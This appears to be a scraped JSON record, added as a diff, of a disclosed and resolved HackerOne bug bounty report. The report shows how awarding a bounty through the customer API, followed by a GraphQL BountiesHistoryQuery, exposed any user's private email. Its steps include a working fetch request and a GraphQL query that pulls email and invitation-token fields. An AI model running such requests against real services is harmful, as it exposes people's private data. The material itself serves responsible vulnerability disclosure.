@@ -1,0 +1,218 @@
+{
+  "id": 2382120,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzgyMTIw",
+  "url": "https://hackerone.com/reports/2382120",
+  "title": "Creation of bounties through Customer API leads to private email disclosure",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-02-20T16:22:43.137Z",
+  "submitted_at": "2024-02-20T16:22:43.419Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0v3rw4tch",
+    "url": "/0v3rw4tch",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/be8v4e5ntsqec9mb2f3w1jfvrnz6/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-03-26T13:10:59.472Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-03-26T13:10:59.024Z",
+  "team_member_agreed_on_going_public_at": "2024-03-26T13:07:54.905Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nHello team,\nIt is possible to reveal any user email using the `BountiesHistoryQuery` request.\nTo demonstrate this, I will make use of both the API and the graphql requests.\n\n### Steps To Reproduce\n\n1. Log in to your account and create a demo\n2. Head over to https://hackerone.com/organizations/████/settings/api_tokens and create a token with the report manager role\n3. Head over to any profile of a user in hackerone and copy their user id\n4. Use this request below to award a program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is your sandbox program id.\n```\nlet inputBody = \"{\\n  \\\"data\\\": {\\n    \\\"type\\\": \\\"bounty\\\",\\n    \\\"attributes\\\": {\\n      \\\"recipient_id\\\": \\\"██████████\\\",\\n          \\\"amount\\\": 51,\\n      \\\"reference\\\": \\\"newbounty\\\",\\n      \\\"title\\\": \\\"BOUNTY FROM Sandbox\\\",\\n      \\\"currency\\\": \\\"USD\\\",\\n      \\\"severity_rating\\\": \\\"high\\\"\\n    }\\n  }\\n}\";\nlet user = 'identifier';\nlet password = 'token';\nlet headers = new Headers();\nheaders.set('Authorization', 'Basic ' + btoa(user + \":\" + password));\n  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');\n\nfetch('https://api.hackerone.com/v1/programs/{id}/bounties',\n{\n  method: 'POST',\n  body: inputBody,\n  headers: headers\n})\n.then(function(res) {\n    return res.json();\n}).then(function(body) {\n    console.log(body);\n});\n\n```\n5. You will get a success message\n\n██████\n6. After awarding the bounty, make the following Graphql request. Where `handle` is the handle of your sandbox team\n```\n{\"operationName\":\"BountiesHistoryQuery\",\"variables\":{\"handle\":\"████\",\"pageSize\":25,\"product_area\":\"other\",\"product_feature\":\"other\"},\"query\":\"query BountiesHistoryQuery($handle: String!, $pageSize: Int!, $cursor: String) {\\n  team(handle: $handle) {\\n    id\\n    currency\\n    offers_bounties\\n    state\\n    bounties(first: $pageSize, after: $cursor) {\\n   pageInfo {\\n        endCursor\\n        hasNextPage\\n        __typename\\n      }\\n         edges {\\n          node {\\n          id\\n    awarded_user{username} invitations{email token}     awarded_amount\\n          awarded_bonus_amount\\n          created_at\\n          report {\\n            id\\n            database_id: _id\\n            reporter {\\n     email          id\\n              username\\n              __typename\\n            }\\n            title\\n            __typename\\n          }\\n          total_awarded_amount\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n7. Notice the email of the user is shown in the response\n\n█████████\n\n## Impact\n\nReveal any user email",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-04-25T13:07:55.542Z",
+  "allow_singular_disclosure_after": -69003329.47807321,
+  "singular_disclosure_allowed": true,
+  "vote_count": 99,
+  "voters": [
+    "amr_id",
+    "loaymorad",
+    "n4tur3_",
+    "ch0c0p0t",
+    "orange303",
+    "n1m0",
+    "ganeshbagaria",
+    "similardisaster",
+    "datph4m",
+    "w31rd0",
+    "and 89 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "2382120",
+  "votes": 99,
+  "latest_disclosable_activity_at": "2024-05-09T10:02:49.393Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:43:25.221102",
+    "source": "https://hackerone.com/reports/2382120.json",
+    "report_id": 2382120
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzgyMTIw",
+    "databaseId": "2382120",
+    "title": "Creation of bounties through Customer API leads to private email disclosure",
+    "url": "https://hackerone.com/reports/2382120",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2024-03-26T13:10:59.472Z",
+    "created_at": "2024-02-20T16:22:43.137Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.3
+    },
+    "reporter": {
+      "username": "0v3rw4tch"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81NTcxNzA=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2024-03-06T13:51:23.448Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81NzYxOTQ=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2024-05-09T10:02:49.155Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzIzODIxMjA=",
+    "_id": "2382120",
+    "disclosed": true,
+    "votes": 99,
+    "latest_disclosable_activity_at": "2024-05-09T10:02:49.393Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzgyMTIw",
+      "databaseId": "2382120",
+      "title": "Creation of bounties through Customer API leads to private email disclosure",
+      "url": "https://hackerone.com/reports/2382120",
+      "disclosed_at": "2024-03-26T13:10:59.472Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    }
+  }
+}
